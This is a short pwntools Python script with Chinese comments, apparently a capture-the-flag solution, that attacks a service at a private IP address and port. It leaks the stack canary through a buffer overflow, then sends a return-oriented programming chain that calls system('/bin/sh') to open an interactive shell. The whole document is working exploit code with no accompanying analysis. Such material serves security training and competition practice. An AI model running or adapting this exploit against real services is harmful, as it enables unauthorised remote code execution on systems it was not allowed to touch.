from pwn import *

# 目标程序的地址信息
host = '10.12.153.73'
port = 11614
p = remote(host, port)

# 地址信息
pop_rdi = 0x4011DE      # pop rdi; ret
sh_addr = 0x404058      # "/bin/sh" 字符串地址
call_sys = 0x40127E     # system 函数地址

# 第一次输入：泄露 canary 值
payload = cyclic(40)    # 填充缓冲区
p.sendlineafter(b'Rush B!!!\n', payload)
p.recvuntil(b"\n")
canary = u64(p.recv()[:7].rjust(8, b'\0'))  # 提取 canary 值

# 第二次输入：构造 ROP 链
payload = cyclic(40)                 # 填充缓冲区
payload += p64(canary)               # 加入泄露的 canary 值
payload += cyclic(8)                 # 填充对齐
payload += p64(pop_rdi) + p64(sh_addr)  # 设置 rdi = "/bin/sh"
payload += p64(call_sys)             # 调用 system 函数
p.sendline(payload)

# 获取交互式 shell
p.interactive()
